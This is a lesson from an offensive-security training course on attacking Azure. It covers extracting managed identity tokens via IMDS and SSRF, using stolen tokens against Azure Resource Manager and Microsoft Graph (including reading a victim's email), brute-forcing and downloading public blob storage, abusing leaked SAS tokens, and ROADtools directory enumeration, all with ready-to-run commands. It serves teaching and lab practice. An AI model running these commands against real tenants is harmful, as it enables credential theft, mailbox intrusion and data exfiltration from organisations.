---
title: "Azure for Attackers — AAD, Managed Identity, Storage Blob Misconfiguration"
tags: [Azure, AAD, Azure-Active-Directory, managed-identity, blob-storage,
       service-principal, SSRF-metadata, az-cli, ATT&CK-T1078.004,
       ATT&CK-T1552.005, cloud-exploitation, microsoft-graph]
module: 04-BroadSurface-02
day: 189
related_topics:
  - Cloud Threat Model (Day 181)
  - AWS IAM Fundamentals (Day 182)
  - GCP for Attackers (Day 190)
  - Cloud Hardening (Day 195)
---

# Day 189 — Azure for Attackers

> "Azure is AWS in a different accent. The metadata endpoint is the same idea.
> The IAM model is different — Azure uses RBAC on resources, not policies on
> identities. The storage misconfiguration looks identical. The big difference
> is Azure Active Directory: it is the identity plane for both Azure and
> Microsoft 365. Compromise AAD, and you are inside Office 365, Teams, SharePoint,
> and every SaaS tool the organisation has connected to it. That is why
> everyone wants the Azure AD token."
>
> — Ghost

---

## Goals

By the end of this lesson you will be able to:

1. Explain Azure's identity model: AAD users, service principals, managed
   identities, and RBAC roles.
2. Access the Azure Instance Metadata Service (IMDS) and extract managed
   identity tokens.
3. Use the `az` CLI and Microsoft Graph API with stolen tokens.
4. Identify and exploit publicly accessible Azure Blob Storage containers.
5. Enumerate Azure resources and permissions from a foothold with managed
   identity credentials.

---

## Prerequisites

| Requirement | Reference |
|---|---|
| Cloud threat model | Day 181 |
| AWS IAM fundamentals (for comparison) | Day 182 |
| HTTP and API concepts | Days 21–22 |

**Tools:**

```bash
# Azure CLI
curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash
az version

# PowerShell + Az module (optional)
Install-Module -Name Az -AllowClobber -Scope CurrentUser

# ROADtools — Azure AD enumeration
pip install roadtools
```

---

## Part 1 — Azure Identity Model

### 1.1 — Principal Types

| Principal | Description | Credential type |
|---|---|---|
| **AAD User** | Human identity in Azure AD | Password + MFA |
| **Service Principal** | Application identity | Client secret or certificate |
| **Managed Identity** | Auto-managed service principal for Azure resources | No credential — token from IMDS |
| **Guest User** | External identity (B2B) invited to tenant | External IdP |

**System-assigned managed identity:** auto-created and tied to the lifecycle
of one resource (VM, App Service, Function). No credential management needed.

**User-assigned managed identity:** a standalone identity that can be assigned
to multiple resources. More flexible; often used for shared access patterns.

### 1.2 — Azure RBAC vs AWS IAM Comparison

| Concept | AWS | Azure |
|---|---|---|
| Permission document | IAM Policy (JSON) | Role Definition (JSON) |
| Assignment | Attach policy to principal | Role Assignment (principal + role + scope) |
| Scope | Resource ARN | Management Group / Subscription / Resource Group / Resource |
| Built-in admin role | AdministratorAccess | Owner |
| Managed identities | IAM Instance Profile (EC2) | Managed Identity |

### 1.3 — Azure RBAC Key Roles

| Role | What it can do |
|---|---|
| **Owner** | Full control, including managing access (most powerful) |
| **Contributor** | Full resource management, cannot manage access |
| **Reader** | Read-only across all resources in scope |
| **User Access Administrator** | Manage access assignments only |
| **Storage Blob Data Owner** | Full access to blob containers |
| **Storage Blob Data Reader** | Read-only blob access |

---

## Part 2 — Azure Instance Metadata Service

### 2.1 — Metadata Endpoint

Azure IMDS is at `http://169.254.169.254` (same IP as AWS — by convention):

```bash
# Get instance metadata
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/instance?api-version=2021-02-01" \
  | python3 -m json.tool

# Get managed identity token — the Azure equivalent of AWS IMDS credential extraction
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token\
?api-version=2018-02-01\
&resource=https://management.azure.com/" \
  | python3 -m json.tool
```

Response:
```json
{
  "access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6...",
  "client_id": "e5a6dfbb-6d2c-4555-a83b-4985697b1234",
  "expires_in": "86399",
  "expires_on": "1704067200",
  "ext_expires_in": "86399",
  "not_before": "1703980800",
  "resource": "https://management.azure.com/",
  "token_type": "Bearer"
}
```

**The `resource` parameter determines the token's scope.** Common resources:

| Resource URL | Service |
|---|---|
| `https://management.azure.com/` | Azure Resource Manager (all Azure resources) |
| `https://graph.microsoft.com/` | Microsoft Graph (AAD, M365) |
| `https://storage.azure.com/` | Azure Storage |
| `https://vault.azure.net` | Azure Key Vault |
| `https://database.windows.net/` | Azure SQL |

### 2.2 — SSRF to Azure IMDS

```bash
# Same SSRF pattern as AWS — pivot SSRF to Azure metadata
curl "http://vulnerable-app.example.com/fetch\
?url=http://169.254.169.254/metadata/identity/oauth2/token\
%3Fapi-version%3D2018-02-01%26resource%3Dhttps://management.azure.com/"
# Note: the Metadata: true header must also be included — some SSRF vulnerabilities
# allow custom headers; some do not. Test both scenarios.
```

---

## Part 3 — Using a Stolen Azure Token

### 3.1 — Azure Resource Manager API

```bash
TOKEN="eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIs..."
SUBSCRIPTION_ID="xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"

# Decode the JWT to understand the identity
echo $TOKEN | cut -d'.' -f2 | base64 -d 2>/dev/null | python3 -m json.tool
# Shows: appid, oid (object ID), tid (tenant ID), roles

# List subscriptions the token has access to
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions?api-version=2022-12-01" \
  | jq '.value[] | {id: .subscriptionId, name: .displayName}'

# List all resource groups
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions/$SUBSCRIPTION_ID/resourceGroups\
?api-version=2022-12-01" | jq '.value[].name'

# List all resources
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions/$SUBSCRIPTION_ID/resources\
?api-version=2022-12-01" | jq '.value[] | {name: .name, type: .type}'
```

### 3.2 — Az CLI with Stolen Token

```bash
# Log in with a managed identity token (from within the resource)
az login --identity

# Or inject a stolen token
az login --service-principal \
  --username $CLIENT_ID \
  --password $CLIENT_SECRET \
  --tenant $TENANT_ID

# Enumerate what the identity can access
az role assignment list --all   # What roles does this identity have?
az resource list --output table  # What resources are in scope?
az storage account list --output table  # Storage accounts?
az keyvault list --output table         # Key Vaults?
```

---

## Part 4 — Microsoft Graph API Enumeration

If the token is for `https://graph.microsoft.com/`, you have access to
Azure AD and Microsoft 365 data.

```bash
GRAPH_TOKEN="eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIs..."  # graph.microsoft.com token

# Get information about the current user
curl -s -H "Authorization: Bearer $GRAPH_TOKEN" \
  "https://graph.microsoft.com/v1.0/me" | jq .

# List all users in the tenant (requires Directory.Read.All)
curl -s -H "Authorization: Bearer $GRAPH_TOKEN" \
  "https://graph.microsoft.com/v1.0/users" \
  | jq '.value[] | {id: .id, email: .mail, displayName: .displayName}'

# List all groups
curl -s -H "Authorization: Bearer $GRAPH_TOKEN" \
  "https://graph.microsoft.com/v1.0/groups" | jq '.value[].displayName'

# List application service principals (find secrets / certificates)
curl -s -H "Authorization: Bearer $GRAPH_TOKEN" \
  "https://graph.microsoft.com/v1.0/servicePrincipals" \
  | jq '.value[] | {appId: .appId, displayName: .displayName}'

# Read emails of the victim user (if Mail.Read scope)
curl -s -H "Authorization: Bearer $GRAPH_TOKEN" \
  "https://graph.microsoft.com/v1.0/me/messages?$top=10" \
  | jq '.value[] | {subject: .subject, from: .from.emailAddress.address}'
```

---

## Part 5 — Azure Blob Storage Misconfiguration

### 5.1 — Discovering Blob Storage Accounts

Azure Storage account naming pattern: `{account}.blob.core.windows.net`

```bash
# Passive recon — look for storage account URLs in HTML, JavaScript, or DNS
curl -s https://target-app.com | grep -oP '[a-z0-9]+\.blob\.core\.windows\.net'

# Brute force common storage account names
NAMES="targetapp targetappprod targetappdev targetappbackup targetappassets"
for name in $NAMES; do
  code=$(curl -so /dev/null -w '%{http_code}' \
    "https://${name}.blob.core.windows.net/?comp=list")
  echo "$name → $code"
done
```

### 5.2 — Checking Public Access

```bash
ACCOUNT="targetappbackup"
CONTAINER="backups"

# List blob containers (if storage account has public blob access enabled)
curl -s "https://${ACCOUNT}.blob.core.windows.net/?comp=list"
# → XML listing of containers

# List blobs in a public container
curl -s "https://${ACCOUNT}.blob.core.windows.net/${CONTAINER}?restype=container&comp=list"

# Download a specific blob (no credentials needed if public)
curl -o backup.sql \
  "https://${ACCOUNT}.blob.core.windows.net/${CONTAINER}/backup-2024-01-01.sql"

# Check access level via az CLI (if authenticated)
az storage container show-permission \
  --account-name $ACCOUNT \
  --name $CONTAINER
# publicAccess: blob | container | off
```

### 5.3 — Shared Access Signature (SAS) Token Exposure

Azure SAS tokens are credentials embedded in a URL, granting time-limited
access to storage resources:

```
https://account.blob.core.windows.net/container/file.pdf
?sv=2022-11-02
&ss=b
&srt=co
&sp=rwdlacupiytfx
&se=2025-01-01T00:00:00Z
&st=2024-01-01T00:00:00Z
&spr=https
&sig=XXXXXXXXXXXXXXXX
```

**Attack scenarios:**

- SAS tokens in GitHub repositories, JavaScript bundles, email bodies
- SAS tokens with write permissions → content injection
- SAS tokens with long expiry (up to years) → persistent access
- Account-level SAS tokens (`srt=o` includes `c`=container scope) → access all containers

```bash
# Test if a found SAS token is still valid and what permissions it has
az storage blob list \
  --container-name uploads \
  --account-name targetapp \
  --sas-token "?sv=2022-11-02&ss=b&sp=rwdlacupiytfx&sig=..."
```

---

## Part 6 — ROADtools for AAD Enumeration

ROADtools is the Azure AD equivalent of Pacu:

```bash
# Authenticate with a stolen token
roadrecon auth -t ACCESS_TOKEN

# Gather all AAD data (users, groups, apps, service principals)
roadrecon gather

# Query the database
roadrecon query users | head -20
roadrecon query applications | head -20
roadrecon query servicePrincipals | head -20

# GUI browser
roadrecon-gui
# → http://localhost:5000
```

---

## Key Takeaways

1. **Azure IMDS is at the same IP as AWS IMDS (`169.254.169.254`) but uses
   a different API.** The required header `Metadata: true` is an SSRF
   differentiator — SSRF vulnerabilities that do not allow custom headers
   cannot exploit Azure IMDS directly.
2. **The `resource` parameter determines the token's power.** A token for
   `management.azure.com` controls Azure infrastructure. A token for
   `graph.microsoft.com` controls identity and M365. Get both.
3. **Azure Blob Storage misconfiguration is identical to S3.** Public
   container access is controlled by the storage account's public access
   setting and the container's access level. The tools and approach differ;
   the vulnerability class is the same.
4. **SAS tokens are credentials in URLs.** They leak through logs, browser
   history, Referer headers, and code repositories. A SAS token with write
   access to a storage container is equivalent to a write-enabled S3 pre-signed URL.
5. **AAD Graph access is the highest-value Azure token.** It provides read
   access to the entire organisation's identity data — all users, groups,
   service principals, and application secrets registered in AAD.

---

## Exercises

1. Request a managed identity token from inside an Azure VM or App Service
   (or simulate via LocalStack's Azure-equivalent mock). Decode the JWT.
   What claims does it contain? What resource is it valid for?
2. Using `az storage container list` on a test storage account: identify a
   publicly accessible container. Download its contents without credentials.
   Document the exact commands.
3. Research: what is the difference between a System-Assigned and a
   User-Assigned managed identity? Which one is more dangerous to over-privilege,
   and why?
4. Research: Azure Entra ID (formerly AAD) introduced Conditional Access
   Policies. How do they limit the use of stolen tokens? What condition can
   prevent a stolen managed identity token from being used from the attacker's
   machine (not from the original Azure resource)?

---

## Questions

> Add your questions here. Each question gets a Global ID (Q189.1, Q189.2 …).
> Follow-up questions use hierarchical numbering (Q189.1.1, Q189.1.2 …).

---

## Navigation

← Previous: [Day 188 — Container and ECS Attacks](DAY-0188-Container-and-ECS-Attacks.md)
→ Next: [Day 190 — GCP for Attackers](DAY-0190-GCP-for-Attackers.md)
